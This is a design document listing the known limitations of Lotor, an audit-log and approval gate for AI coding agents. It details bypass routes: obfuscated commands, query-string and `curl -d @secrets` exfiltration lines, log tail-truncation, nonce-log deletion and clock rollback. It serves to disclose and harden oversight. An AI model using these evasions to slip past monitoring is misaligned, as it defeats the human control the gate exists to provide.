# Known Limits

This document lists the v1 limitations of the receipt layer. Honesty about limits is a feature.

## 1. Self-attested capture

Tamper-evidence begins at signing time. The log proves that *what was recorded* has not been altered since, but it does not prove that the recorded events were complete, accurate, or truthful at the moment of capture. The receipt is only as good as the data fed into it.

## 2. Outbound message capture

Outbound activity is now captured live by a `PostToolUse` hook for egress-shaped tool calls (network requests, remote git operations, publish commands), using the same matchers the policy engine uses to decide what is gate-worthy. This is captured by the host at the moment the tool call completes, not reconstructed later from a transcript, which is a real improvement in attestation strength. It is still not wire-level capture: there is no network proxy, no TLS interception, and no independent verification that the tool's own implementation reported its outcome honestly. A tool that lies about its own `tool_response`, or an egress path this repo's matchers do not recognize, is not captured. True wire-level capture would require a network-boundary proxy, which is a larger architectural change and not in v1.

Because the same matchers drive both capture and the `egress-other` gate, a gap in one is a gap in the other. A 2026-07-24 review closed several named gaps (`Invoke-RestMethod`/`irm`, `wget --post-file`/`--post-data`, `curl -T`). One deliberately remains: a plain GET carrying data in its query string, e.g. `curl https://host/collect?data=...`, is neither gated nor captured, because there is no flag to match on and gating every query-string GET would fire on ordinary API reads. Data leaving in a GET URL is the honest hole here, and it is the reason egress capture must not be read as complete.

## 3. No external anchoring in v1

The chain is local-only. External anchoring (to a timestamp authority, blockchain, or other notary) is a planned later enhancement. In v1, tamper detection relies on local key custody and periodic manual export/offsite backup.

## 4. Cost is reported in tokens, not dollars

Where the session transcript records per-turn token counts, receipts carry them. Dollar cost is not computed in v1: it requires an external, model-specific price table that is not bundled. Treat the cost column as token usage, not a billing figure.

**Re-verified 2026-07-26 against `895a176`. Still true, unchanged.** Recorded
because a re-check that finds nothing is worth as much as one that finds
something, and limit 29 exists precisely because nobody could tell when an entry
was last held against the code. The parser still carries `note: 'tokens only; no
USD in source'` and no price table exists anywhere in `src/`. This entry was
grouped with 13 in a work item titled "per-model cost attribution", which is a
different claim: 13 is about *whose* tokens, 4 is about *dollars*. **Amending 4
on the strength of that grouping would have been exactly the error that produced
limit 27's correction**, and it was avoided only by reading the source.

## 5. Session receipts are cumulative subsessions, not a single record

Claude Code fires `SessionEnd` more than once for the same session (on clear, on resume, on exit). Each firing that carries new activity appends a new receipt for that session, indexed `subsession` 0, 1, and so on. Nothing is ever amended or superseded, because the chain is append-only by design.

Two consequences worth knowing:

Each subsession receipt carries the whole session up to that moment, not just the new part. Subsession 2 is a superset of subsession 1. No single receipt is "the" record of a session; the highest subsession is the most complete one. Counting receipts is not the same as counting sessions, which is why the morning-after view reports both totals separately.

A firing that adds no new activity appends nothing, so repeated `SessionEnd` events cannot inflate the chain. Work done after the final firing is still never captured, since nothing runs after the last one.

## 6. Auto-capture is opt-in and hook-dependent

Receipts are written automatically only if Lotor's hooks are registered in your Claude Code settings. Four hooks now write to the chain: `SessionStart` opens a session record, `PreToolUse` records policy warnings and gated-action denials/approvals, `PostToolUse` records egress-shaped tool calls, and `SessionEnd` writes the session receipt. Installing the MCP server alone gives you the query, verify, and gate tools against an empty chain. Nothing is recorded until the hooks are wired up (see the README install steps) or a transcript is ingested by hand. Enforcement, likewise, only covers tool calls made after `PreToolUse` is registered and loading.

## 7. A receipt can be dropped under lock contention

Chain appends take an exclusive lock so concurrent writers cannot corrupt the chain. The lock waits a bounded time (about five seconds) and then gives up. The `SessionEnd` hook treats that give-up like every other failure: it reports one line to stderr and exits 0, because a receipt layer that can wedge your editor is worse than a missing receipt.

The consequence is that under heavy contention, or if a lock is held by a process that is stuck but not yet stale, a session can end without being receipted. The failure is announced on stderr rather than silent, but nothing retries it later. The chain stays valid and no partial entry is written. You lose that one receipt, not the log.

## 8. The chain signing key is stored unencrypted

There are two keys and they are protected very differently.

The approval key, which authorizes gated actions, is never written to disk. It is derived from your passphrase at signing time, so only the public half is stored.

The chain key, which signs log entries for tamper-evidence, is written to `keys/chain.key` in plaintext (mode 0600 where the filesystem honors it). Anyone who can read that file can forge chain entries that verify cleanly. Tamper-evidence therefore assumes an attacker who can alter the log file cannot also read the key file, which is a weak assumption on a fully compromised machine. Hardware-backed key custody (TPM or secure enclave) is the fix and is not in v1.

## 9. The chain key is per-machine, so receipts do not verify across machines

The chain key is generated on first use and lives on that machine. Receipts written on one machine will not verify on another unless you copy the chain public key across. The approval key behaves differently: because it is derived from your passphrase, the same passphrase reproduces the same approval key anywhere. Expect a single-machine chain in v1.

**Amended 2026-07-26, verified against `895a176` by reading the source and
running an export/verify round trip on the live 640-entry chain.**

The gap this entry described is closed. `bin/export-chain.js` (`npm run export`,
`npm run verify:bundle`) packages the chain public key and every entry into one
file that verifies against the **supplied** key rather than the local one. The
private key is never read by that file, so a bundle is safe to hand to someone.

The sentence above is what made this worth building: "unless you copy the chain
public key across" described a *possibility*, not a workflow. Nothing packaged
the two halves and nothing verified against a supplied key, so in practice the
record was one only its owner could read. **A record you cannot hand over is
most of the way back to trusting the party being audited**, which is the thing
this project exists to refuse.

**What is still true.** The key remains per-machine and generated on first use;
this makes a chain *portable*, not *multi-machine*. Two installs still produce
two independent chains under two keys, and nothing merges them. And a clean
verify on a bundle inherits every limit the local chain has: tail-truncation
still leaves a valid prefix (limit 22) and capture was self-attested to begin
with (limit 1). The verifier prints both of those rather than a bare tick, which
is the correct behaviour and is also why "VALID" must not be read as "complete".

## 10. Approval key strength is entirely passphrase strength

The approval key is derived with PBKDF2 (600,000 iterations, SHA-256) from your passphrase and a salt that is a compile-time constant, not a per-install random value. Two people who choose the same passphrase get the same approval key, and precomputation against that fixed salt is shared across every installation. Iteration count raises the cost of guessing but does not change the fact that a weak passphrase yields a weak key. Choose accordingly. A per-install random salt is a later change and would be a breaking one, since it alters key derivation.

## 11. The gate matches patterns, and patterns are evadable

The `PreToolUse` hook enforces Lotor's policy by pattern-matching the tool name and `tool_input`. v1's threat model is the honest agent making a consequential move without sign-off: accident, overreach, a naively followed injected instruction. The gate is not designed to withstand an adversarial model that is engineering around the matcher; command-string matching can be evaded by obfuscation, for example building the verb from fragments or invoking through a wrapper binary that the matcher cannot see into. If you need adversarial-grade containment, this is not the layer to rely on.

One evasion that used to belong on that list no longer does. Until 2026-07-24, running a dangerous action through a shell other than `Bash` (PowerShell on Windows) bypassed the command rules entirely, and for `self-mod` it did so in the default configuration, no obfuscation required. That was a defect, not an adversarial technique, and it is fixed: the command rules now key on the shape of the input, not the tool's name (see limit 21). It is called out here because earlier drafts of this entry listed "a non-`Bash` tool name" as an example of adversarial obfuscation, which understated it. It was not a clever evasion; it was the gate not being armed for the machine's own shell.

A few honest corollaries that follow from the same shape:

Engine errors fail open by design. A Lotor bug (policy unreadable, evaluator crash, store I/O failure) must not brick every tool call, so the hook reports on stderr, appends a best-effort receipt when it can, and exits 0. A gate that never lets a tool run is worse than a gate that occasionally lets one through with a note.

A bare `git push` to a checked-out protected branch is not detected. The `push-protected` rule fires only when the command explicitly names `main` or `master` as a ref. A `git push` with no ref, or with the ref given through a shell variable, flows free; the merge point, not the push, is what protects the branch.

Hook registration lives in the user's settings file, whose edits are themselves rule 1. A hostile edit landing between sessions is therefore only caught at the next session's snapshot, not in real time. Treat the registration surface as part of your threat model.

## 12. Pre-fix receipts are permanently ~2x inflated (cost/2 corrects this going forward)

Before 2026-07-22, the parser summed `message.usage` once per JSONL line. Claude Code
writes one assistant message across several lines (a text block, then one line per
`tool_use` block), and every one of those lines carries a byte-identical copy of the same
usage object. The parser counted it 2 to 6 times, so every token figure in every receipt
signed before this fix is inflated, empirically by a factor close to 2x (measured 2.083
and 2.035 on two independent real transcripts; verified exact, not heuristic, since zero
usage conflicts were found among lines sharing a `message.id`).

The fix (this commit) dedups usage by `message.id`, with a fallback to `requestId`, then
`uuid`, then a per-line key for entries that carry none. Receipts written from this point
forward carry `cost.schema: 'cost/2'`; its absence marks a receipt as pre-fix and roughly
double reality. Because the chain is append-only, no existing signed receipt can be
corrected or replaced. Old figures stand as signed and wrong. Do not trust a token count
on a receipt without a `cost.schema` field.

## 13. Cost is not attributed per model or per harness

`cost` is one flat total per session, summed across every assistant message regardless of
which model produced it. `session.model` records only the last model seen in the
transcript, overwritten on every assistant turn. It is not a breakdown: a session that
touches more than one model (for example, the orchestrating session on Claude plus work
dispatched mid-session to an Ollama-hosted model) reports a single blended total under a
single trailing model name.

This matters because different providers report token usage on fundamentally different
bases. One real comparison found a service reporting 702,944,347 input tokens with zero
cache activity, against another reporting 8,487 input tokens and 163,480,857 cache-read
tokens for comparable work. Summing across services, or reading `session.model` as "the
model this session's cost was incurred on," produces a number with no coherent meaning.
Per-model, per-harness cost attribution is not built. Treat any total from a mixed-model
session as directional at best, never as a cross-service comparison.

**Amended 2026-07-26, verified against `895a176` by reading `src/parser/index.js`
and running its tests. HALF of this closed. The half that did not is the half the
title names second, and the entry stays open on that basis.**

**Per-model: built.** Receipts now carry `cost.byModel`, a per-model breakdown of
input, output, cache-creation and cache-read tokens plus a message count, under
schema `cost/3`. A message with no model field lands in an `unknown` bucket
rather than being dropped, so the buckets do not silently lose work. Crucially,
**no sum across buckets is produced**, deliberately: the entry's own argument is
that adding tokens across providers yields a number with no coherent meaning, so
the fix must not quietly reintroduce the blend it was built to expose.

**Per-harness: not built, and nothing has changed.** There is no `harness` field
anywhere in `src/`. A chain written by two harnesses still cannot say which one
wrote what. This matters more now than when the entry was written, because a
second harness is a live plan rather than a hypothetical, and the field has to
exist *before* the second harness starts writing or the entries it produces are
retroactively unattributable. An append-only chain cannot be backfilled.

**And the flat total is still there.** `session.model` still records only the
last model seen. The breakdown sits alongside it rather than replacing it, so
anything reading `session.model` as "the model this session's cost was incurred
on" is still wrong in exactly the way described above. Read `byModel`, not the
top-line total.

**Amended again the same day, about two hours later. The paragraph immediately
above that says "per-harness: not built" is now false, and leaving that gap
unmarked for even an afternoon is the exact behaviour limit 29 describes.**
Recording it as a second dated note rather than editing the first, because the
sequence is the useful artifact: a disclosure written carefully at midday was
wrong by early afternoon, which is how short the half-life actually is.

**Per-harness: built.** `src/harness.js` resolves a harness for every
`session-open` entry, and `bin/hook-session-start.js` writes it into the chain.
It was shipped *before* the second harness rather than with it, because the
chain is append-only and **an entry written without the field can never acquire
it** — every entry a second harness produced first would have been permanently
unattributable.

**It never returns a bare name, and that is the load-bearing part.** The block
carries a `basis`:

- `declared` — an operator or launcher set `LOTOR_HARNESS`, or the payload named
  itself. Trustworthy exactly to the degree whoever set it is.
- `inferred` — guessed from the payload's shape, requiring **two** independent
  signals rather than one, and shipping the evidence that produced the guess.
- `unknown` — nothing to go on. **It stays `unknown` and never defaults to
  `claude-code`.** Defaulting an unattributable entry to the common harness
  would convert missing information into a false statement that a reader has no
  way to detect, which is worse than an absent field.

**What this is not: authentication.** A harness naming itself is self-attested,
exactly as capture is (limit 1). Anything that can set an environment variable
can call itself anything. This makes a mixed chain **separable under honest
conditions**; it does not make the label adversarially trustworthy, and nothing
here should be read as proving provenance.

**Residual, stated rather than left to be discovered.** The field is on
`session-open` only. Gated-action entries and session receipts do not carry it
and are attributable only by association through their session. That is
sufficient for splitting a chain by harness and is not the same as per-entry
provenance. The per-model half above is likewise unchanged by this: cost is
still not broken down per harness, only per model.

## 14. A session that dies badly leaves an open, not a full record

**Partly fixed.** Capture used to be driven entirely by `SessionEnd`: a session
that was force-killed, crashed, hit an OOM, or lost power wrote no receipt at
all, so the chain showed an unbroken run of well-behaved sessions and no trace
that any others existed. The sessions most worth a record were exactly the ones
the design dropped.

`SessionStart` now opens the record at the moment a session begins, anchoring
the session id, the source, the policy in force and its digest, the chain head,
a verify result, and which Lotor hooks were registered. An abnormal exit now
leaves an opened-but-never-closed entry, and `npm run receipts` reports the
unclosed count under SESSION OPENS. Silence has become evidence.

What is still true after the fix:

An open is not a record of the work. It says a session started, under which
policy, from which chain head. Everything between the last captured tool call
and the crash is still unknown. The unclosed marker tells you where to stop
trusting the log, not what happened past that point.

It only works if the hook is registered. A Lotor install with `SessionEnd`
wired up and `SessionStart` missing has exactly the old failure mode, silently.
`npm run receipts` says so explicitly when it finds zero opens, and each open
receipt carries a snapshot of which hooks it could see in your settings, but a
snapshot taken at start cannot catch an edit made after it.

Read the absence of a receipt as "unknown", never as "nothing happened". That
instruction survives the fix. It now applies to a narrower window.

Related, and unchanged: the gate only protects tool calls that occur after its
`PreToolUse` hook is registered and loading. Anything the harness runs before
the gate is live is ungated by construction, which is the argument for the
receipt layer being the first thing a session spins up rather than the last.

## 15. Lotor's mode and your harness's permission mode are independent

Herding modes (Herded / Grazing / Loose, 2026-07-23) govern what Lotor's own
gate requires. They know nothing about, and cannot see, whatever permission
mode the harness running the agent is in. If the harness itself has a mode
that bypasses its own confirmation prompts, that mode operates on a completely
different layer: Lotor's gate still fires and still blocks, because it is a
hook the harness invokes regardless of the harness's own prompt settings.

The genuinely dangerous combination is the other direction: Lotor in Loose
mode plus a harness-level setting that skips tool-call review entirely. Loose
already warns rather than blocks on every rule except `self-mod` and
`mode-change`; a harness that also isn't pausing to show the human anything
means nothing stands between the agent and the action on either layer. Neither
layer is aware the other exists, so neither can compensate for the other being
permissive. Choosing Loose is a deliberate choice about Lotor's layer only;
it says nothing about what your harness is configured to do on its own.

**Correction, 2026-07-24.** The claim above that the two layers "cannot see"
each other was wrong in one direction. Claude Code sends `permission_mode` on
every hook event, including `PreToolUse`, so Lotor receives the harness's mode
on every gated call and was discarding it in `parsePayload()`. "Cannot see"
was an assumption that was never checked, and it was false.

**Now detected.** `bin/hook-pre-tool-use.js` warns when Lotor is in Loose and
the harness reports `bypassPermissions`, `dontAsk` or `auto`, and records the
posture on the chain once per session with both modes named. What that buys
is visibility, not protection:

- It warns, it does not block. Loose is a deliberate choice about Lotor's
  layer and escalating it to a denial would override a setting made on
  purpose.
- `acceptEdits` is excluded on purpose. It is partial, since edits
  auto-accept while commands still prompt, and warning on a posture that is
  usually reasonable is how a warning gets ignored.
- The detection depends on the harness reporting its mode honestly. It is a
  field in a payload, not an attestation, so it tells you what the harness
  says about itself.

Everything else in this entry stands. The layers still do not compensate for
one another, and Loose plus a permissive harness is still the combination to
avoid; it is simply no longer silent.

## 16. An approval token has no expiry

`verifyApproval()` (`src/gate/index.js`) checks the token's structure, that its
request matches the action being attempted, that its nonce has not been used
before, and its signature. It never checks the token's `timestamp` against the
current time. A signed token is valid until its nonce is spent, however much
time has passed since it was signed — an approval from a week ago for an
action that is only now being attempted still verifies cleanly. There is no
freshness window: staleness alone is not a rejection reason in v1.

Replay protection is real but conditional on one file. A used nonce is
recorded by appending to `keys/approval-nonces.log`, and the check is a scan
of that file. Since tokens never expire, deleting that log restores every
token ever signed to validity. That file lives under `keys/`, which the
`self-mod` rule now gates across every shell (fixed 2026-07-24; before that
it was gated for `Bash` only), so erasing it through the tool layer requires a
signature. A process with direct filesystem access, outside the gated tools,
can still delete it, and the same residual applies to the chain itself (limit
22). The log also grows without bound and is scanned linearly on every gated
call.

**Amended 2026-07-26, verified against `895a176` by reading `src/gate/index.js`
and running `test/approval-token-freshness.test.js`.**

The first paragraph is closed. `verifyApproval()` now checks the token's
`timestamp` against the clock and rejects on both sides: older than 60 minutes
is stale, and more than 120 seconds in the future is a clock problem or a forged
stamp. **A stale token gets its own denial reason naming the age and the limit**,
rather than presenting as a mismatch, because a stale-token denial that read like
a mismatch would send the operator hunting the wrong problem. Sixty minutes was
chosen for the away-signing case rather than for security: the owner may sign
from a phone over their own VPN, and a tighter window would manufacture false
failures in the exact workflow it exists to serve. Every false failure teaches
the operator to sign faster and read less (limit 26).

**The second paragraph is narrowed, not closed, and the distinction is the
point.** Deleting `keys/approval-nonces.log` no longer restores *every token ever
signed* — it restores only those signed within the last hour. That is a real
reduction in blast radius and it is not a fix: a process with direct filesystem
access outside the gated tools can still delete the log, and any token inside its
window comes back. The clock-proof bound is still the single-use nonce; the
freshness window reads the system clock, so moving the clock backward widens it,
exactly as limit 20 already notes for grant expiry. **Two ceilings, one
clock-dependent and one not.** Neither alone is the guarantee.

Unbounded log growth and the linear scan on every gated call are unchanged.

See also limit 30: expiry bounds how long a banked signature waits and does not
stop one from existing, and a token spent inside its window is spent on whatever
command matches.

## 17. A grant lets one signature cover many executions

Delegation grants (2026-07-24) exist because a single-use token covers one
exact request and is spent once, so a session that hits the gate forty times
means forty signatures, and in practice that means the gate gets turned off. A
grant is one signature over N enumerated requests, bound to one session, with
an expiry and a shared action ceiling.

The comparison is byte equality over `canonicalizeRequest()`, the same
function and the same canonical form the token layer already uses. So a grant
inherits nothing from limit 11: there is no pattern to evade, because nothing
here pattern-matches.

**What a grant genuinely gives up, relative to a token.** A token is reviewed
once and spent once. A grant is reviewed once and spendable up to
`maxActions` times inside its window. A command you read and approved can
therefore run repeatedly with no further review. That is the trade, made
deliberately, and it is the one respect in which a grant is weaker than the
primitive it extends. Size `maxActions` accordingly, and remember that
approving a command is approving every effect of running it that many times.

What a command does once it runs is still not knowable from its text. A grant
changes only how many times an already-reviewed string may run. It does not
make the string safer, and nothing in the grant path inspects behaviour.

## 18. The chain now records authorised command strings in plaintext

Recording a grant on the chain (2026-07-24) means the enumerated requests are
written to `chain.jsonl` in full, including exact command strings and file
paths. This is deliberate: a digest would let you verify a grant file you
still hold, but not reconstruct what was authorised once that file is gone,
and reconstruction is the point of recording it.

It does change what the log contains. Elsewhere the chain stores a
`paramsDigest` rather than parameters, so before this change most tool
arguments were present only as hashes. Authorised commands are now readable in
the log. The log is local and operator-held, which is the premise of the whole
system, but if you were relying on the chain being mostly hashes, it no longer
is for this entry type.

## 19. A grant can be revoked by deleting a file, and only by that

There is no revoke command. A grant stops applying when it expires, when its
ceiling is spent, or when its file is deleted from `<LOTOR_HOME>/grants/`.

Deleting requires no signature. That direction fails safe, since removing a
grant only ever reduces capability, and since 2026-07-24 the authorisation
itself is recorded on the chain, so deleting the file destroys the capability
without destroying the record of what was granted. But it does mean anything
with write access to your Lotor home can disable your own approvals, and the
first sign of it is work being denied that you expected to go through.

## 20. Grant expiry depends on the system clock

`expiresAt` is compared against `Date.now()`. Moving the machine clock
backwards extends every unexpired grant. Nothing here consults an external
time source, and limit 3 (no external anchoring) applies to grants exactly as
it applies to receipts.

This is why grants carry two independent ceilings. `maxActions` is counted
from `grant-use` entries on the append-only chain and does not depend on the
clock at all, so a grant with a clock-proof ceiling of 5 is bounded at 5 uses
regardless of what the clock says.

That bound holds under concurrency, but only because it was fixed to. An
earlier version counted uses from a chain snapshot read *before* the lock and
appended *after* it, so two overlapping gated calls under one grant could each
observe the same count and each proceed, exceeding `maxActions` by the number
of calls in flight. The check and the append now run together inside the
chain lock (`appendReceiptGuarded`), so the count the decision uses is the
same view the `grant-use` entry lands on. Regression guard:
`test/grant-concurrency.test.js` fires a barrier-synchronised burst and
asserts exactly `maxActions` approvals land; the pre-fix path was confirmed to
exceed the ceiling under the same barrier.

## 21. The command rules match strings, not intent

The rules that read a command line reason about its text, not about what it
will do. That cuts both ways, and an adversarial review on 2026-07-24 found
it cutting the wrong way in several rules at once. The under-gating defects
that review found were fixed the same day; the over-gating that remains is
by design. Both are recorded here, because a reader extending the rule set
needs to know it matches text, and a reader trusting the gate needs to know
where that was getting the answer wrong.

### Under-gating found and fixed, 2026-07-24

Each of these let a dangerous command through. Each is closed, with a
regression test named.

- **`self-mod` fired only for the `Bash` tool.** Its matcher only ever read
  `tool_input.command`, but the dispatcher gated it behind `toolName ===
  'Bash'`. On Windows, where PowerShell is the primary shell, the gate's own
  source, its policy, its hooks, and the receipt chain could be rewritten
  unsigned in every mode. This was the most serious finding: not an
  obfuscation an adversary had to construct, but the default configuration
  failing to enforce. Fixed: `isSelfMod` routes any command-carrying tool
  through the command matcher (`src/policy/index.js`). Guard:
  `test/selfmod-covers-core.test.js` exercises Bash, PowerShell and Edit.
- **`self-mod` protected only `src/gate` and `src/policy`.** The grant
  verifier (`src/grant`), the hash chain (`src/chain`) and the store
  (`src/store`) were ungated, though `core-paths.js` already treated them as
  non-delegable. Two lists that were meant to agree had drifted. Fixed: the
  self-mod fragment list now covers every core directory, and
  `test/selfmod-covers-core.test.js` reads the real `core-paths` export and
  fails if they drift again.
- **`opaque-exec` was disabled by a read verb anywhere in the string.**
  `.\deploy.ps1 -Type full` was read as containing the verb `type` (a
  hyphen is a word boundary) and exempted, defeating the rule created for the
  deploy incident. Fixed: the read-verb exemption must now LEAD its segment,
  and the command is split on shell separators so `read a.ps1 && ./evil.ps1`
  gates on the second segment.
- **The destructive allowlist matched substrings.** `rm -rf ./templates`
  was exempted because `temp` appears inside `templates`. Fixed: whole
  path-segment equality; `templates`, `attempts` and `contemplation` gate.
- **`egress-other` missed common exfiltration forms.** `Invoke-RestMethod`
  / `irm` (the usual PowerShell API call), `wget --post-file` / `--post-data`,
  and `curl -T` were unrecognised. Fixed: all added.
- **A commit message hid an executable substitution.** `git commit -m
  "$(curl -d @secrets ...)"` had its message blanked before matching, hiding
  the curl the shell would run. Fixed: a message containing `$(...)`,
  backticks or `${...}` is left intact so the matchers see it.
- **The grant ceiling was not concurrency-safe.** See limit 20.

### Over-gating that remains, by design

These make the gate cost more than it strictly must. The direction is the
safe one: a false denial costs a signature, a false allow costs the
guarantee. They are recorded so the cost is not a surprise.

- **Reading a protected file costs a signature.** `cat`, `grep` or `sed` of a
  gated path is denied like an edit, because both are commands naming the
  path. Reading through a tool the rule does not cover (the Read tool) is not
  denied, so the cost is uneven rather than uniformly high.
- **Prose naming a protected path trips the gate.** A commit message or a
  heredoc that merely *mentions* the gate's source matches. Writing about the
  gate looks, to a text matcher, like modifying it.
- **A script the engine cannot read is treated as executable even when it is
  only being read.** `opaque-exec` gates `sed -n 1,5p deploy.ps1` because
  `sed` can also mutate in place (`sed -i`); it does not try to prove the
  invocation is read-only.

### Why the remaining over-gating is not simply relaxed

The obvious relaxation, exempting commands that begin with a read verb, was
tried on 2026-07-23 and opened a hole within minutes: only the first token
was checked, so a read verb followed by a redirect could overwrite the file
the rule protects. The suite caught it and it was reverted whole. A relaxation
that is actually safe has to classify on whether a command can *mutate*,
across an arbitrary shell string, where the mutation can hide inside a script
the matcher cannot read. That is the wall `opaque-exec` exists to acknowledge.

The standing rule for this matcher: crying wolf is the cheap failure, silence
is the expensive one, and any change that makes it quieter has to answer what
it now misses.

## 22. Tamper-evidence detects alteration and head-truncation, not tail-truncation

`verifyChain()` (`src/chain/index.js`) recomputes each entry's hash, checks its
signature, checks that entry 0 carries the genesis constant, and checks that
each entry's `prevHash` links to the one before it. Removing entries from the
*head* breaks the genesis check and is caught. Removing entries from the
*tail* is not: the remaining prefix is internally consistent, every hash and
signature still verifies, and `seq` simply resumes from the shortened length.
Nothing outside the file records how long the chain should be, so a truncated
chain passes `npm run verify` clean.

This needs no key. Deleting or truncating `chain.jsonl` through the tool layer
now requires a signature, because `receipts/` is gated by `self-mod` across
every shell (fixed 2026-07-24; before that, gated for `Bash` only). The
residual is a process with direct filesystem access, outside the gated tools,
which can truncate the tail and leave a chain that verifies. Closing that
needs something the file cannot provide about itself: an external anchor (limit
3) or an off-chain signed head-marker, and any purely local marker is itself a
deletable file subject to the same move. It is not fixed in v1 because there is
no honest local-only fix.

Read a clean `verify` as "what remains has not been altered", never as
"nothing was removed."

## 23. self-mod over-gates conventional source-dir names in unrelated repos

The `self-mod` rule protects Lotor's own core directories by literal path
segment: `src/gate/`, `src/policy/`, `src/chain/`, `src/store/`, `src/grant/`,
and the rest. The matcher keys on the segment text, not on the Lotor install's
actual repo location, which it does not know. So a command touching a directory
of the same conventional name in an **unrelated** project run through the same
Lotor install is gated as self-mod: `cat ./src/store/model.js` in your own app
trips the gate and costs a signature, even though it has nothing to do with
Lotor. This is the accepted over-gating direction (crying wolf is the cheap
failure, limit 21), but the blast radius is wider than Lotor's own tree: any
repo with a `src/store`, `src/chain`, or `src/grant` path. Scoping the match to
the Lotor install's own directory would require the matcher to know that path,
which is not wired in v1.

A related asymmetry from the same rule: a command *ending* in the fragment with
a trailing slash (`ls ./src/chain/`) slips, because `normalizePath` strips the
command's trailing slash before matching, while the file form
(`.../src/store/x.js`) gates. The over-gate is real for the file form; the
trailing-slash directory form is an under-gate of the same rule.

## 24. The destructive allowlist exempts real directories named tmp/temp/scratchpad/mktemp

`destructiveAllowlisted` exempts an `rm -rf` / `Remove-Item` whose resolved path
has **any** segment equal to `tmp`, `temp`, `scratchpad`, or `mktemp`. A real,
non-scratch directory that happens to sit under such a name (`/var/tmp`,
`/etc/tmp`, `/production/data/tmp`) is therefore exempted from the destructive
gate. The 2026-07-24 `..`-normalization fix (limit 21) closed the traversal
*escape* (`rm -rf /tmp/../etc` no longer launders to an exempt verdict, because
`..` pops the scratch segment before the check runs), but the any-segment
leniency itself is by design: the allowlist exists so routine scratch cleanup
does not cost a signature, and tightening it to a leading-segment-only rule broke
legitimate deletion of nested scratch dirs like `/home/me/scratchpad/run-1`.
Exposure is limited to targets genuinely sitting under a scratch-named directory.

## 25. The gate knew git's transports and not git's vendor CLI

Until 2026-07-24, `gh` — the GitHub CLI, authenticated against the user's account
from the system keyring — was almost entirely invisible to the rule set. Three
specific shapes were matched (`gh pr merge`, `gh release create`, `gh * create`);
everything else was not. Verified live, not hypothesized: `gh repo edit` changed a
public repository's description with no gate, no warning, and no signature request,
while a plain `git push` to the same repository would have gated. Ungated by the
same omission: `gh repo edit --visibility public`, `gh api` with any mutating
method, `gh secret set`, `gh release delete`, `gh workflow run`, `gh repo delete`.
That was a live, credentialed write path to every repository the account owns, and
the inconsistency was worse than the gap: the rules gated the low-level transport
and allowed the high-level tool that wraps it.

Fixed the same day, structurally rather than by extending the verb list. `gh` is
treated as what it is, an authenticated remote API client, and every invocation
gates as egress unless its subcommand is on a short read-only allowlist (`view`,
`list`, `status`, `checks`, `diff`, `search`, `browse`, `clone`, `download`,
`watch`, `help`, `version`, `completion`). Write verbs are not enumerated
anywhere, because enumerating the bad list is the shape that leaked here and
leaked one terminator per round in the gauntlet (limit 21): a subcommand this
matcher has never heard of, including whatever `gh` ships next year, gates by
default. `gh api` always gates regardless of method; it is the raw escape hatch,
and a `-f` field silently turns its GET into a POST.

What this does not fix, stated against interest: the matcher recognizes `gh` by
name. Any other authenticated CLI on the machine — `aws`, `az`, `gcloud`,
`vercel`, `flyctl`, an npm-installed deploy tool — is still invisible unless its
traffic happens to go through a transport the rules already know. A
network-capable binary cannot be recognized as such from its command string. This
entry adds one row with the right polarity; it does not close the class. The class
limit is limit 21's: the rules match strings, not intent.

## 26. The matchers scanned prose as code, and the gate cried wolf on its own commit messages

Until 2026-07-24, two command rules (`push-force`, `push-protected`) matched
against the raw command string including commit-message text, and the two that did
strip messages (`publish`, `egress-other`) un-stripped the entire command whenever
a backtick or `$(` appeared anywhere in it, so one markdown code span in a message
re-exposed all of it. Heredoc bodies were never stripped at all. Verified live,
twice in a row: a plain `git add && git commit` into a repository with no remote
configured was denied first by `push-protected`, because the commit message
described a future `git push origin main`, and then, after rewording, by `publish`,
because the new text mentioned releases and merges. No push was possible from that
repository. The gate was blocking the description of an action, not the action.

This is the corrosive failure, not the expensive one: every false denial teaches
the operator to sign without reading, and approval fatigue is how a real denial
eventually gets signed through.

Fixed by stripping provably inert prose at one choke point (`matchableCommand`)
used by every command matcher, so no rule can forget to strip; two rules forgetting
was half of this defect. What the gate now deliberately does not see, stated
plainly because it is the cost:

- the argument of `-m` / `--message` when single-quoted (the shell performs no
  expansion inside single quotes, ever), or double-quoted with no `$(`, `${`, or
  backtick inside that region;
- heredoc bodies fed to `git commit|tag|notes|merge`, `cat`, or `tee`, with no pipe
  on the heredoc line, when the delimiter is quoted or the body contains no
  expansion syntax.

Why the trade is acceptable: every blanked region is one the shell delivers as
literal data to a program that treats it as text. What stays visible, verified by
regression tests run against the unfixed code first: `bash -c 'git push ...'` (an
interpreter argument is not a message and is not stripped), `-m "$(...)"` and
backticks inside double quotes (those execute), any heredoc feeding an interpreter
or a pipeline (`bash <<EOF`, `cat <<EOF | bash`), `git apply` patches, and
unquoted-delimiter bodies carrying substitutions. The consumer list is an allowlist
on purpose: a consumer not on it keeps its body visible, so a gap in that list
over-gates rather than misses. PowerShell here-strings (`@'...'@`) are not stripped
at all and can still false-positive; that noise is kept for the shell the engine
understands least.

Residual, against interest, two items. First, quoting is parsed with regexes, not a
real shell grammar; a construction that makes a regex see "single-quoted" where the
shell sees code would be a silent miss. None is known, and any future change here
carries limit 21's standing burden: a change that makes the gate quieter must state
what it stops seeing. Second, a body written through `cat` or `tee` that stages
command-looking text — a cron file, a shell profile — is no longer accidentally
flagged at write time. The write itself executes nothing, and if a later tool call
runs the file the rules see that execution; but an execution that happens outside
the session (cron picking up the file) was never visible to the gate, and the
accidental early warning the old false positive provided is gone. Staging
persistence through a prose write is a candidate for a path-based scope-escalation
rule, not a reason to scan prose again.

**Residual confirmed live, 2026-07-25.** The consumer allowlist that decides whose
body gets stripped covers `git commit|tag|notes|merge`, `cat`, and `tee`. It does
not cover `printf`. A shell `printf` used only to write a note was denied by
`opaque-exec` because the note's *text* quoted a deploy script's filename, with no
execution of that script attempted. The allowlist behaves exactly as designed here,
since a consumer not on the list keeps its body visible and therefore over-gates
rather than misses, which is the safe direction. It is recorded because the cost is
real and recurring: prose about the system is the system's own documentation, and
the tool that writes it is the tool most likely to trip.

Two consequences worth stating. The correct response to a false positive of this
shape is to use the dedicated tool for the job, Read or Write or Edit instead of a
shell one-liner, and never to reword the prose until it slips past the matcher.
Rewording to evade a control is the drift this system exists to catch, and it does
not stop being drift because the trigger was a false positive. And a real fix is
harder than the terminator-enumeration closure applied on 2026-07-24: the matcher
would have to distinguish a string that is a command's target from a string that is
inert text the command writes out, which means parsing structure rather than
substring-matching a flat command line.

## 27. Signature binding is exact, so any command mutation burns a fresh signature

An approval token is single-use and bound to the literal command string staged at
